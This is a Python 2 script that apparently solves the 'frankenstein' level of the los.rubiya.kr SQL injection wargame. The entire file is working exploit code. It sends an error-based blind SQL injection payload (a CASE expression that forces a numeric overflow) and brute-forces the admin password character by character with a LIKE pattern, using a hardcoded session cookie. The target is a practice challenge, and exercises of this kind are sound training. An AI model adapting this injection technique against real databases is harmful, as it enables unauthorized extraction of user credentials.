#!/usr/bin/env python

import urllib
import urllib2
import sys

URL = "https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php"
UA =  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36"
Cookie = "PHPSESSID=crjq6ca1cbdnj7kveoa16pmuvf"


def query(Q):
    UURL = URL + "?pw=" + urllib.quote(Q)
    req = urllib2.Request(UURL, {}, {
        'User-Agent': UA,
        'Cookie': Cookie
    })

    res = urllib2.urlopen(req)
    text = res.read()
    if "location.href" in text:
        print "Session expired..."
        sys.exit()
        
    return not "php" in text

password = ""
guess_table = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_'

def guess(pattern):
    return query("' or case when id='admin' and pw like '{}' then 9e307*2 else 0 end#".format(pattern))
while True:
    for ch in guess_table:
        if guess(password + ch + "%"):
            password += ch
            print password
            break